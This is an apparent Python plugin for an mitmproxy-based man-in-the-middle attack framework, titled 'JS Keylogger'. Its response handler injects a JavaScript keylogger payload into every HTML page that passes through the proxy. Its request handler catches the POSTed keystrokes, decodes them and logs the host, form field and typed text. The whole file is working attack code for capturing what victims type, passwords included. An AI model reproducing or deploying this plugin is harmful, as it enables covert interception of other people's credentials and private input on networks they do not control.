from plugins.plugin import Plugin
from bs4 import BeautifulSoup
from libmproxy.protocol.http import decoded

class JSKeylogger(Plugin):
    name = 'JS Keylogger'
    optname = 'jskeylogger'
    desc = 'Injects a javascript keylogger into clients webpages'
    version = '0.2'

    def request(self, context, flow):
        if flow.request.method == 'POST' and ('keylog' in flow.request.path):
            context.handle_post_output = True

            raw_keys = flow.request.content.split("&&")[0]
            input_field = flow.request.content.split("&&")[1]

            keys = raw_keys.split(",")
            if keys:
                del keys[0]; del(keys[len(keys)-1])

                nice = ''
                for n in keys:
                    if n == '9':
                        nice += "<TAB>"
                    elif n == '8':
                        nice = nice[:-1]
                    elif n == '13':
                        nice = ''
                    else:
                        try:
                            nice += n.decode('hex')
                        except:
                            context.log("[JSKeylogger] Error decoding char: {}".format(n))

                context.log("[JSKeylogger] Host: {} | Field: {} | Keys: {}".format(flow.request.host, input_field, nice))

    def response(self, context, flow):
        if flow.response.headers.get_first("content-type", "").startswith("text/html"):
            with decoded(flow.response):  # Remove content encoding (gzip, ...)
                html = BeautifulSoup(flow.response.content.decode('utf-8', 'ignore'))
                if html.body:
                    tag = html.new_tag('script', type='text/javascript')
                    with open('./core/javascript/msfkeylogger.js', 'r') as payload:
                        tag.append(payload.read())
                    html.body.append(tag)
                    context.log("[JSKeylogger] Injected JS payload: {}".format(flow.request.host))

                    flow.response.content = str(html)
